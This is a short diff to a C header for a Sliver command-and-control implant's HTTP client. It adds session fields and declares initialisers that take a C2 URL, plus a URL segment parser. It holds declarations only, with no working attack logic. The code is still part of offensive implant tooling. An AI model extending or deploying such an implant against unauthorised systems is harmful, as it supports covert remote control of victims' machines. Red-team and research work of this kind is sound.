@@ -138,6 +138,8 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	PHTTP_CLIENT pHttpClient;
 	CHAR szSessionID[33];
 	CHAR szSliverName[32];
+	CHAR szConfigID[32];
+	UINT64 uPeerID;
 	PBYTE pSessionKey;
 	LPSTR lpRecipientPubKey;
 	LPSTR lpPeerPubKey;
@@ -168,6 +170,7 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	DWORD dwPollTimeout;
 	DWORD dwMaxErrors;
 	LPSTR lpServerMinisignPublicKey;
+	BOOL IsClosed;
 } SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;
 
 typedef enum {
@@ -298,7 +301,10 @@ PHTTP_REQUEST CreateHttpRequest
 	_In_ DWORD cbData
 );
 
-PSLIVER_HTTP_CLIENT SliverSessionInit();
+PSLIVER_HTTP_CLIENT SliverSessionInit
+(
+	_In_ LPSTR lpC2Url
+);
 
 VOID FreeSliverHttpClient
 (
@@ -308,4 +314,15 @@ VOID FreeSliverHttpClient
 LPSTR StartSessionURL
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient
+);
+
+PSLIVER_HTTP_CLIENT SliverHttpClientInit
+(
+	_In_ LPSTR lpC2Url
+);
+
+LPSTR ParseSegmentsUrl
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient,
+	_In_ SegmentType SegmentType
 );
